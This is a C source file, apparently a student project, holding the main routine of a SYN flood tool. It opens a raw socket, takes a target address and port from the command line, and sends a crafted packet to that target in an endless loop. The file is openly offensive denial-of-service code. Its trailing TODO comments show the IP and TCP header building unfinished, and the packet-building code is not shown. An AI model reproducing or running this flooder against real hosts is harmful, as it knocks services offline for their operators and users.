/*
** main.c for main in /home/janel/Projects/templates/network/SYN_flooder
**
** Made by Janel
** Login   <janel@epitech.net>
**
** Started on  Mon May 29 12:19:55 2017 Janel
** Last update Mon May 29 21:42:51 2017 Janel
*/

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include "syn_flooder.h"
#include "network_miscellaneous.h"
#include "layer3.h"
#include "debug.h"

static void	usage(const char * const prog_name)
{
  fprintf(stderr, "[-] USAGE: %s <hostname> <port>\n", prog_name);
}

static void	set_destination_address(struct sockaddr_in *dest_addr,
					const in_addr_t target,
					const int port)
{
  dest_addr->sin_family = AF_INET;
  dest_addr->sin_port = htons(port);
  dest_addr->sin_addr.s_addr = target;
}

int			main(int argc, char *argv[])
{
  int			sd;
  struct sockaddr_in	dest_addr;
  unsigned char		*packet;

  if (argc != 3)
    return (usage(argv[0]), EXIT_FAILURE);
  if ((sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
    return (PRINT_ERROR("Socket: "), EXIT_FAILURE);

  srand(time(NULL));
  (void)set_header_ip_inclusion(sd);

  /* /\* either CONNECT() (FAIL) OR set sockaddr_in and send or sendmsg *\/ */

  set_destination_address(&dest_addr, inet_addr(argv[1]), atoi(argv[2]));

  if (!(packet = build_packet()))
    return (EXIT_FAILURE);

  while (1)
    {
      if ((sendto(sd, packet, ((t_ip_header *)packet)->total_length, 0, (const struct sockaddr *)&dest_addr, sizeof(struct sockaddr_in))) == -1)
	return (PRINT_ERROR("sendto(): "), EXIT_FAILURE);
    }
  close(sd);

  return (EXIT_SUCCESS);
  (void)dest_addr;
}


/* get_args */					/* DONE */
/* create socket layer 3 RAW */			/* DONE */
/* fill sockaddr_in */				/* DONE - need error handling */
/* build ip header */				/* IN PROGRESS */
/* build tcp header */
/* send arbitrary packet to hostname:port */
